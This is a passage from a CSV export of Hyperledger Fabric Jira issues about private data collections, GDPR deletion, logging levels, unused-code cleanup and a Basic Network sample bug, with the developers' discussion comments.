Ensure that peers can now endorse against old private data.",,,,,,C0rWin,denyeart,manish-sethi,nirro,troyronda,wutongtree,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/18 11:03 AM;troyronda;Would this be needed when a policy update adds an organization to a collection (via FAB-5096)?

Copied this comment from FAB-5096:
 * Ability for _a joining organization to retrieve a copy of existing collection data_. In cases where an organization is granted access to data covered by one or more policies, they should have the ability to replicate the existing data to their peers from other (willing) organization(s)’ peers, as a capability of Fabric.;;;","24/Jul/18 12:04 AM;manish-sethi;High - level design doc - https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit
 [~nirro] - will add sequence diagrams to this.;;;","24/Jul/18 5:42 PM;nirro;https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit?usp=sharing;;;","25/Aug/18 9:47 PM;denyeart;Split into two stories:
FAB-11301 for gossip side.
FAB-11302 for ledger side.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Query history of private data - by key, block, or transaction id",FAB-5094,18802,,Story,To Do,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,29/Jun/17 9:20 PM,20/Jan/21 3:10 AM,28/Oct/23 3:00 AM,,,,,Future,,fabric-ledger,,,,,,6,,,,,,,"Add a history index and chaincode API similar to public data history to enable the query of history of a private data key.

Additionally, add an API to get private data write sets for a certain block number or transaction id, similar to how you can get public data for a certain block number or transaction id.

For users that need history of private data, until this is implemented, in the interim in the chaincode you could take a hash of the private data and save it with a regular PutState(). Then you could do GetHistoryForKey() on that hashed key to find all the historical transactions for the private data key.

 ",,baohua,davidkhala,denyeart,ever-upwards,jathin.sreenivas,jgdomine,joaquimpedrooliveira,Pancham,Paradox-AT,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4981,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzwqrk:5iwr4rb0zyw5",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,davidkhala,denyeart,ever-upwards,jathin.sreenivas,jgdomine,joaquimpedrooliveira,Pancham,Paradox-AT,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jan/19 11:44 AM;davidkhala;is there more detailed work flow provided?;;;","13/Aug/20 1:02 AM;Paradox-AT;Guys any updates or workarounds??;;;","17/Aug/20 10:00 PM;denyeart;[~Paradox-AT] Workaround is mentioned in the last paragraph of Description.;;;","09/Oct/20 10:51 AM;Pancham;[~denyeart] I will like to work on this issue. Can you please give me some pointers to get started? Thanks;;;","20/Jan/21 3:10 AM;jathin.sreenivas;I am trying the above-mentioned approach for getting the history. But I am not sure what is the key I am supposed to store in the state database as the hash value? For example, should it be the asset ID? And also if suppose I retrieve the history from a private collection, will it be the actual data or the hashed data? Can you let me know the function to hash the key?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger support for private data using goleveldb (simulation/validation/commit),FAB-5095,18803,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,29/Jun/17 9:22 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,26/Aug/17 12:11 AM,,,,,,,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6bb:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support changes to private data collection configuration such as organization mapping,FAB-5096,18804,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:23 PM,07/Dec/18 11:50 AM,28/Oct/23 3:00 AM,16/May/18 5:06 AM,,,,v1.2.0,,fabric-gossip,fabric-ledger,,,,,1,,,,,,,design doc - [https://docs.google.com/document/d/1ORt3HFE13gnq204lXNp6i1BpMLMm-RAKVts8cH50kK4/edit?usp=sharing],,denyeart,jufeng.yao,manish-sethi,ScottAllan,Senthil1,troyronda,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-7643,,,,,,,,,FAB-5093,FAB-5092,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8718,,,,,,,,,"1|hzwswn:",,,,Unset,,May2018 - NextGen Endorsement,,,,,,Unset,,,,,,,,,,,denyeart,jufeng.yao,manish-sethi,ScottAllan,Senthil1,troyronda,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/18 10:41 AM;troyronda;[~denyeart] The ability to update collection configuration is very important, since organizations can come and go and purge policies need updates over time.

I'd label the priority of this item very high in the context of the SideDB feature.;;;","30/Jan/18 2:56 AM;troyronda;Capabilities for organizations to join and leave are needed along with considerations for existing data access.
 * Support for implementing _new policies on an existing collection_. Over time, organizations can join and leave. In particular:
 ** New organizations will need to transact against existing collections.
 ** In some private data collections, new organizations will need to transact/access against data covered by one or more previous policies. In some other private data collections, new organizations do not access existing data and wouldn’t be granted access to data covered under previous policies.
 ** Removed organizations should not receive new data.
 ** Need the ability to implement new collection policy for other parameters – particularly evolving purge policies (FAB-5092).
 * Ability for _a joining organization to retrieve a copy of existing collection data_. In cases where an organization is granted access to data covered by one or more policies, they should have the ability to replicate the existing data to their peers from other (willing) organization(s)’ peers, as a capability of Fabric. Related: FAB-5093;;;","16/Mar/18 5:30 AM;manish-sethi;Initial design doc - https://docs.google.com/document/d/1ORt3HFE13gnq204lXNp6i1BpMLMm-RAKVts8cH50kK4/edit?usp=sharing;;;","29/May/18 2:41 PM;jufeng.yao;one question for peer's knowledge of private data (or collection) : from design doc, there are 2 assumptions 
1, Private data is accessible to {color:red}all peers on the channel{color} (assumption for core solution in Section 2, assumption is revised in Section 3 to allow partitioning of private data).
2, When storage partitions are defined, private data is not persistently known to all peers on the channel, but rather a subset of peers. The private data is, {color:red}however, temporarily known across the channel (revised from Section 1, assumption 2){color}.

what I'm not sure is that : does these mean that {color:red}Unauthorized peers{color} can also persistently (from #1) or temporarily (from #2) access the private data? 

for example, 3 orgs : org0 (org0-peer0 & org0-peer1), org1 (org1-peer0 & org1-peer1), org2 (org2-peer0 & org2-peer1), while peers from org2 aren't allowed to access private data. 

for #1, peers from org2 can still get private data for txes by gossip in endorsement? (since design doc says : ESCC will make sure at least K other peers for redundancy, The K other peers will also store the private read write set in their temp DB and continue gossipping to {color:red}make the data available across the peers in the network. {color})
for #2, peers from org2 can temporarily get keys & values for range query validation? (since range query must apply against to private data)

if I'm correct, seems private data can't completely keep secret from unauthorized peers, right?

thanks  ;;;","30/May/18 11:01 PM;manish-sethi;[~jufeng.yao] - No, only authorized Orgs get the private data. In your example above org2 won;t get the private data.

In your scenario #1, K other peers are subset of the authorized members and  hence the K should be less than the size of the member-set for a collection. Similarly, in your scenario #2, a range query on the private data on org2 is meaningless and client should not send the query to org2 in this example.;;;","31/May/18 10:31 AM;jufeng.yao;[~manish-sethi], thanks very much for explains. 

{color:red}client should not send the query to org2 in this example{color}
do you mean hashed RW set returned doesn't contain range query read set at all ?  since it is meaningless for unauthorized org2, and range query read set already saved in temp db, right?

thanks very much;;;","31/May/18 11:39 AM;manish-sethi;[~jufeng.yao] yes.

In addition, before returning any query results on a private data for a single key, the peer performs a check whether it has the pvt data corresponding to the hashes present in the public space. In your example, the org2 does not have any pvt data, hence any point query on org2 will result in an error.;;;","31/May/18 3:52 PM;jufeng.yao;[~manish-sethi], thanks very much. 
after I checked your answers several times, seems we are talking about different things of range query ^^. what I asked is this:
 client send proposal to endorsers (org1.peer1, org2.peer0) which will access private data, we pick response from org1.peer1 as an example, suppose it will include hashed RW set, focus on hashed read set, it will include hashed keys & values, but {color:red}do not include range query result{color} (right?), then client will commit tx which include hashed RW set, first to orderer, and finally to peers, include {color:red}unauthorized peers{color} (org2.peer0, org2.peer1), we pick org2.peer1 as our target, when block validation, single hashed key & value in hashed read set can be checked against to normal db, since they should already exist, while range query of private data is not included in hashed RW set, so unauthorized peers needn't verify them. 

Please check and point out any mistakes if I'm not correct, thanks very much.;;;","31/May/18 4:04 PM;manish-sethi;[~jufeng.yao] I see your doubt now. Range queries are in fact, not supported in the update transactions on pvt data for this specific reason. Because, all the peers need to decide whether the transaction is valid or not just based on the hashed read-write set.

Range queries can be used only in a read-only transactions. If you mix writes and a range query on pvt data in a transaction, you will receive an error during simulation.;;;","31/May/18 6:11 PM;jufeng.yao;[~manish-sethi] thanks very much ! that is what exactly I want !;;;","10/Aug/18 3:41 AM;troyronda;There are some remaining TODO comments related to FAB-5096 in https://github.com/hyperledger/fabric/blob/master/core/transientstore/store.go
e.g., https://github.com/hyperledger/fabric/blob/release-1.2/core/transientstore/store.go#L49;;;","10/Aug/18 4:05 AM;Senthil1;Thanks [~troyronda] for pointing this out. Will push a CR.;;;","07/Dec/18 11:50 AM;ScottAllan;When is the plan to deal with the second aspect:

 

*2) Collection BTL (Block-to-live) change*;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
[GDPR support] On demand delete of private data prior to block-to-live policy based on a delete transaction,FAB-5097,18805,,Story,In Progress,FAB,Fabric,software,denyeart,,,High,,calanais,denyeart,denyeart,29/Jun/17 9:24 PM,01/Jul/21 7:55 PM,28/Oct/23 3:00 AM,,,,,v2.x,,fabric-ledger,,,,,,10,,,,,,,"Ability to delete private data from private data storage and private state database on demand by a client request, without having to wait for the typical blockToLive period prior to purging. The blockToLive mechanism is insufficient for use cases that need to be compliant with GDPR, where data must be deleted upon a subject's request.

Option for transaction resulting from DelPrivateData() chaincode API to purge key from peer's private data store and transient store on all peers, in addition to deleting from private state database on all peers.

+*Implementation notes:*+

*Private data store*

The private data store is keyed by block number and transaction index within the block and stores the private writes for a transaction. The private data write for a certain key/value can be removed from this block/tran index, leaving the store in the same state as when the private data was simply missing. We may need to add a marker to indicate that the private data was intentionally deleted and not simply missing. There is also a missing data tracking index that would need to be updated if that key was already marked as missing on the peer (that is, remove the missing entry for any newly purged keys).

To know which block/tran index to purge from private data store, we can look in the private state database. The private state database entry for the key would indicate the last block/tran index 'version' that updated the key. The private writeset can then be removed from the block/tran index in the private data store. Note that prior transactions in the private data store may have also updated the key previously, therefore we may also need a new index that tracks all historical writes for a certain key (this is already maintained for public writes to satisfy GetHistoryForKey() queries, a similar index may be needed for private writes).

*Transient store*

The transient store is keyed by txid and holds private data until the tx is committed. Therefore for committed private data, the entries should already have been removed. There is potential that the key in question is in the transient store for another uncommitted transaction. If that transaction eventually gets committed, then it would re-create the private data key. This may happen in the case of a blind write. But for the more typical read/writes, the uncommitted transaction would likely get invalidated rather than committed if seen in a future block transaction due to the deletion in the current transaction causing a MVCC invalidation. The uncommitted transactions in transient store may never be seen in a future block transaction, in which case the entry will anyways get purged automatically based on the core.yaml transientstoreMaxBlockRetention setting (default 1000 blocks).

*Private data pulling*

Other peers may attempt to pull the private data from this peer, if they are behind in block height or were missing the private data. This peer should respond to the request that the data has been intentionally purged. Currently the requesting peer will try other peers if the private data cannot be found. This logic will need to be updated to stop the retries if it is told that the private data has been intentionally purged.",,baohua,bta,calanais,chbtt,decatluther,denyeart,ever-upwards,nao,nemoto,roberttaylortech,rolivieri,ScottAllan,sheetal-hlf,toddinpal,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15536,,,,,,,,,,,,,,FAB-18461,,,,,,,,,FAB-12045,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-12038,,,,,,,,,"1|hzwqrk:5iwr4rb0zyw6",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,bta,calanais,chbtt,decatluther,denyeart,ever-upwards,nao,nemoto,roberttaylortech,rolivieri,ScottAllan,sheetal-hlf,toddinpal,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/21 6:18 PM;calanais;FYI Picking up this item to work on, will review the designs and comments so far.;;;","01/Jul/21 7:55 PM;calanais;Current working idea is to follow the ideas in point 2 of the design document.  (https://docs.google.com/document/d/1O5UCzf8H_kN4iqMgHm8haDhqacsCBEWNY-dhDG7qgYc/edit#)
{quote}DelPrivateData is implemented as it is now; i.e., the _private write set log_ and the _private history DB_ are left intact. A new operation PurgePrivateData is implemented that immediately purges the private data from the _private state db_, the _private write set log_, (and the _private history DB_ if ever implemented_)_. This requires a new message option in the RWSet for differentiating between DelPrivateData and PurgePrivateData in the committing peer, for instance, it could be an additional is_purge[here|https://github.com/hyperledger/fabric/blob/d942308df6302d3510e835bad62f861ad854b4b3/protos/ledger/rwset/kvrwset/kv_rwset.proto#L61] or we could abuse the value_hash portion of the KVWriteHash.


{quote}
Feedback from one team interested in this function indicates that the 'purge' of the private data is a business activity, and should therefore be under the control of the chaincode function - an audit trail of purging of data being important.

An administrative action is also a possibility to clean up a peer; I'd expect (or is that a hope?) that this would be an exposing of the same underlying function. Therefore I'd propose to move forward with this approach - of an additional CC function.

 

 

 

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a peer operator, when there is missing private data, I would rather have the peer halt than commit without the missing private data",FAB-5098,18806,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:25 PM,23/Jan/20 6:52 AM,28/Oct/23 3:00 AM,23/Jan/20 6:52 AM,,,,Future,,fabric-ledger,,,,,,0,stale-item,,,,,,Add chaincode policy to halt rather than proceed with missing private data.,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzx08n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:52 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a chaincode client, I want to be able to perform queries in private data update transactions (even if phantoms cannot be validated)",FAB-5099,18807,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:28 PM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,,,,Future,,,,,,,,1,stale-item,,,,,,"Add chaincode policy to allow non-key queries in transactions, even if phantom validation cannot be performed due to private data not available (no access or missing).",,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzy6bj:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduction mentions Marbles and is dated vis getting started.,FAB-5100,18808,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,29/Jun/17 9:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 1:47 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,The Introduction mekes reference to Marbles and there is actually a WIP page for something that we have still not received.,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6br:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 9:37 PM;ChristopherFerris;https://gerrit.hyperledger.org/r/11245 FAB-5100;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add salt to private data key/value hashes,FAB-5101,18809,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,29/Jun/17 9:34 PM,21/Oct/19 11:57 PM,28/Oct/23 3:00 AM,21/Oct/19 11:46 PM,,,,Future,,fabric-ledger,,,,,,1,,,,,,,Adding salt to private data is required to avoid dictionary attacks.,,denyeart,grapebaba,sheetal-hlf,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16885,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzx08v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,grapebaba,sheetal-hlf,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Oct/19 11:46 PM;denyeart;Since introduction of private data in v1.2, solutions have been encouraged to add salt to their private data to avoid dictionary attacks. As solutions have had good results with this approach, Fabric maintainers do not intend to have Fabric automatically manage salts.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Add a FAQ section to the readthedocs, Welcome section of the Fabric wiki",FAB-5102,18810,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,luomin,JonathanLevi,JonathanLevi,29/Jun/17 9:45 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Oct/17 11:03 AM,v1.0.0,,,Future,,,,,,,,0,documentation,Documentation,,,,,"Context: https://chat.hyperledger.org/channel/fabric-release?msg=qHiyDCX56g8rzhr5x

As part of the 1.0 release, one of the things that has been requested is an FAQ. I believe that we can use the following document for this purpose: [https://wiki.hyperledger.org/projects/fabric/welcome]. One thing that I see missing from this document is something that highlights the differences between v0.6 and v1.0. Is this documented somewhere that we can pull into the FAQ (even if just as a link)?",,JonathanLevi,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6bz:",,,,,,,,,,,,,,,,,,,,,,,JonathanLevi,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unused code in common packages,FAB-5103,18811,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nnao,ChristopherFerris,ChristopherFerris,29/Jun/17 9:54 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 11:09 AM,v1.0.0-rc1,,,,,fabric-peer,,,,,,0,,,,,,,"cbf$ unused github.com/hyperledger/fabric/common/...

common/config/standardvalues_test.go:47:2: field msg is unused (U1000)

common/mocks/peer/mockccstream.go:58:2: field sendOnRecv is unused (U1000)

common/tools/configtxlator/rest/router.go:24:5: var logger is unused (U1000)",,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6c7:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 9:23 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11287/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unused code in msp packages,FAB-5104,18812,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nnao,ChristopherFerris,ChristopherFerris,29/Jun/17 9:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,29/Aug/17 2:28 AM,v1.0.0-rc1,,,,,fabric-crypto,,,,,,0,,,,,,,"cbf$ unused github.com/hyperledger/fabric/msp/...

msp/cert.go:33:6: type dsaSignature is unused (U1000)

msp/cert.go:37:6: type ecdsaSignature is unused (U1000)

msp/mspimpl.go:1161:22: func (*bccspmsp).getValidityOptsForTLSCert is unused (U1000)",,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6cf:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 8:28 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11275/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unused code in events packages,FAB-5105,18813,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nnao,ChristopherFerris,ChristopherFerris,29/Jun/17 9:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 11:08 AM,v1.0.0-rc1,,,,,fabric-peer,,,,,,0,,,,,,,"cbf$ unused github.com/hyperledger/fabric/events/...

events/consumer/consumer_test.go:29:2: field count is unused (U1000)

events/consumer/consumer_test.go:35:2: field count is unused (U1000)

events/consumer/consumer_test.go:41:2: field count is unused (U1000)

events/consumer/consumer_test.go:45:5: var ehServer is unused (U1000)

events/consumer/consumer_test.go:51:5: var zeroAdapter is unused (U1000)

events/consumer/consumer_test.go:52:5: var zeroObcEHClient is unused (U1000)

events/consumer/consumer_test.go:54:5: var badAdapter is unused (U1000)

events/consumer/consumer_test.go:55:5: var badObcEHClient is unused (U1000)

events/producer/producer_test.go:188:6: func createTestBlock is unused (U1000)",,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6cn:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 8:27 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11277/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow log level overrides for any component at peer start,FAB-5106,18818,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,29/Jun/17 11:39 PM,02/Nov/18 3:06 AM,28/Oct/23 3:00 AM,02/Nov/18 3:06 AM,,,,Future,,fabric-peer,,,,,,0,,,,,,,The peer currently allows a hard-coded set of components to override the log level set via CORE_LOGGING_LEVEL or CORE_LOGGING_PEER. This functionality should be improved to allow any component to be specified (whether in core.yaml or via an environment variable) and override its log level.,,jimouris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy6cv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jimouris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jul/17 1:28 AM;jimouris;Hello, 

Is it possible to disable the INFO logging level? I tried to set --logging-level to DEBUG, but it did not override the INFO, just appended both in the log messages.

Thanks in advance.;;;","05/Jul/17 9:35 PM;wlahti;The valid log levels for the logging package Fabric utilizes are: 
{code:java}
CRITICAL | ERROR | WARNING | NOTICE | INFO | DEBUG{code}
These are in order from the least amount of logging to the most. Setting the level to one of these will include messages from that level and any to the left.

Therefore, if you'd like to disable logging at the INFO level, you need to set the level to at least NOTICE (or WARNING, ERROR, or CRITICAL if you'd like to restrict the logging further). ;;;","02/Nov/18 3:06 AM;wlahti;Addressed via FAB-12357. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Problems with Basic Network sample,FAB-5107,18821,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,chris.elder,chris.elder,30/Jun/17 12:22 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Sep/17 9:53 PM,v1.0.0-rc1,,,v1.0.2,,fabric-samples,,,,,,0,,,,,,,"I set this to High since this impacts sample code.

The Basic Network sample docker-compose.yaml file still refers to the beta docker images:

Example:

ca.example.com:
 image: hyperledger/fabric-ca:x86_64-1.0.0-beta

It might be better to be consistent with the first network sample:

services:
 ca0:
 image: hyperledger/fabric-ca

I did edit the docker-compose.yaml in order to bring up the network,  but I got the following error (highlighted in {color:#d04437}red{color}):

 

# Create the channel

docker exec -e ""CORE_PEER_LOCALMSPID=Org1MSP"" -e ""CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/msp/users/Admin@org1.example.com"" peer0.org1.example.com peer channel create -o orderer.example.com:7050 -c mychannel -f /etc/hyperledger/configtx/mychannel.tx

2017-06-29 14:22:06.141 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts: no such file or directory]

2017-06-29 14:22:06.141 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/tlscacerts: no such file or directory]

2017-06-29 14:22:06.142 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/crls]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/crls: no such file or directory]

2017-06-29 14:22:06.142 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml]: [stat /etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml: no such file or directory]

{color:#d04437}2017-06-29 14:22:06.163 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /etc/hyperledger/msp/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP{color}

 

 ",,chris.elder,denyeart,JonathanLevi,mastersingh24,scottz,sujeeban,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 6:32 AM;sujeeban;confGen.sh;https://jira.hyperledger.org/secure/attachment/11621/confGen.sh","11/Jul/17 6:32 AM;sujeeban;configtx.yaml;https://jira.hyperledger.org/secure/attachment/11622/configtx.yaml","11/Jul/17 6:32 AM;sujeeban;crypto-config.yaml;https://jira.hyperledger.org/secure/attachment/11623/crypto-config.yaml","11/Jul/17 6:33 AM;sujeeban;docker-compose-template.yml;https://jira.hyperledger.org/secure/attachment/11624/docker-compose-template.yml",,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6d3:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,denyeart,JonathanLevi,mastersingh24,scottz,sujeeban,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 3:24 AM;denyeart;Since it is a sample and not runtime code, I have reduced to Medium.;;;","11/Jul/17 3:57 AM;scottz;We are trying to understand 